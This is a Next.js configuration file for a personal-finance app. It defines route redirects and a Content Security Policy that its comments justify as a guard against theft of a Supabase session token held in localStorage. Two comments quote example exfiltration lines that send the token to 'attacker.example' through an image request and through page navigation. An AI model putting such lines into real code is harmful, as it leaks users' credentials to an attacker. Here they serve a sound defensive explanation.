/** @type {import('next').NextConfig} */

// Routes retired in the 2026-07-30 restructure (7 tabs -> 4).
//
// Redirects rather than deletions: these URLs are in browser history, and
// /dashboard is still the post-login target configured in Supabase's OAuth
// provider settings — which live in a dashboard, not in this repo. A 404 there
// would break Google sign-in with no clue why.
//
// Permanent (308) where the move is permanent: /cards genuinely became
// /portfolio. /dashboard is temporary (307) because it returns as "Today" once
// the opportunity engine gives it content, and a permanent redirect cached in
// users' browsers would be awkward to undo.
// Origins this app legitimately talks to. Read from the same env vars the
// client itself reads — `lib/supabase.ts` and `lib/api.ts` — so the policy
// cannot drift from the configuration it describes.
//
// The name matters and got this wrong once: the backend variable is
// NEXT_PUBLIC_BACKEND_URL, not NEXT_PUBLIC_API_URL. With the wrong name the
// list silently came back one origin short, `connect-src` omitted Render, and
// the policy would have blocked every API call in production while building
// and testing clean locally. Hence the assertion below — a security header
// that fails open is bad, and one that fails closed takes the app down.
const API_URL_VAR = "NEXT_PUBLIC_BACKEND_URL";

const connectOrigins = [process.env.NEXT_PUBLIC_SUPABASE_URL, process.env[API_URL_VAR]]
  .filter(Boolean)
  .map((url) => new URL(url).origin);

// Fail the build rather than ship a policy that bricks the deployment.
//
// Keyed on "one is set but not the other" rather than on NODE_ENV, which is
// not yet "production" when Next evaluates this file — the first version of
// this guard tested it and silently never fired, which is the same class of
// bug it exists to catch. A local checkout with neither variable set is a
// legitimate state ('self' covers localhost); a deployment with one of the two
// is always a mistake.
const configuredOrigins = [process.env.NEXT_PUBLIC_SUPABASE_URL, process.env[API_URL_VAR]];
if (configuredOrigins.some(Boolean) && !configuredOrigins.every(Boolean)) {
  throw new Error(
    `CSP connect-src would be incomplete: NEXT_PUBLIC_SUPABASE_URL and ${API_URL_VAR} must ` +
      `both be set at build time, or neither. Got [${configuredOrigins.join(", ")}]. ` +
      `Shipping this would block every call to the missing origin from the browser.`
  );
}

const isDev = process.env.NODE_ENV === "development";

// Content Security Policy (privacy audit P7 mitigation, 2026-07-30).
//
// P7 is the Supabase session token living in `localStorage`, where any script
// on the origin can read it. It was accepted rather than fixed because moving
// to cookie sessions means reworking auth in `Shell`, `lib/supabase.ts` and
// every `api.ts` call — real risk to the thing that currently works.
//
// This is the cheaper defence against the same threat, and it is worth being
// precise about what it does and does not do:
//
//   It does NOT stop injected script from reading the token. `script-src`
//   carries 'unsafe-inline' because the App Router emits inline hydration
//   scripts; removing it needs per-request nonces from middleware, which forces
//   dynamic rendering on every page.
//
//   It DOES stop the token being sent anywhere. `connect-src` allows only
//   Supabase and our own API, and `form-action` and `base-uri` close the two
//   usual ways round that. A credential that can be read but not exfiltrated is
//   a much smaller problem, and this holds even with 'unsafe-inline'.
//
//   It DOES enforce the condition P7 was accepted under. That condition — "the
//   first third-party script added to the frontend" — was a sentence in a
//   document, which is a thing people do not read. As a policy, adding a vendor
//   tag now fails visibly in the browser rather than quietly invalidating a
//   decision made months earlier.
const csp = [
  "default-src 'self'",
  `script-src 'self' 'unsafe-inline'${isDev ? " 'unsafe-eval'" : ""}`,
  "style-src 'self' 'unsafe-inline'",
  // NOT `https:`. That was the first draft, waved through to avoid breaking
  // avatars this app does not display — and it silently defeated the whole
  // point of the policy. `img-src https:` permits
  //
  //     new Image().src = "https://attacker.example/?t=" + localStorage.token
  //
  // which is a complete exfiltration channel that never touches `connect-src`.
  // A CSP whose restrictive directive is bypassed by a permissive one beside it
  // is worse than no CSP, because it reads as protection.
  //
  // Every image this app renders is its own or a data URI. If a remote image is
  // ever needed, allow that one origin — never a scheme.
  "img-src 'self' data:",
  "font-src 'self' data:",
  `connect-src 'self' ${connectOrigins.join(" ")}`.trim(),
  // No embedding: this app shows one person's finances, and clickjacking it
  // into an invisible frame is the cheapest attack there is.
  "frame-ancestors 'none'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
].join("; ");

// The honest limit, recorded so nobody re-derives it under pressure: no CSP can
// stop `location = "https://attacker.example/?t=" + token`. Top-level
// navigation was meant to be covered by `navigate-to`, which no browser
// shipped. So a CSP raises the cost of exfiltration and closes the silent
// channels; it cannot close the loud one. That residue is a reason to keep
// `script-src` honest, not a reason to skip the policy.

const securityHeaders = [
  { key: "Content-Security-Policy", value: csp },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "X-Frame-Options", value: "DENY" },
  // Do not leak the path a user came from — our URLs name the section of their
  // finances they were looking at.
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=(), payment=()" },
];

const nextConfig = {
  reactStrictMode: true,
  async headers() {
    return [{ source: "/:path*", headers: securityHeaders }];
  },
  async redirects() {
    return [
      { source: "/cards", destination: "/portfolio", permanent: true },
      { source: "/transfer", destination: "/redeem", permanent: true },
      { source: "/goals", destination: "/redeem", permanent: true },
      { source: "/dashboard", destination: "/chat", permanent: false },
    ];
  },
};

export default nextConfig;
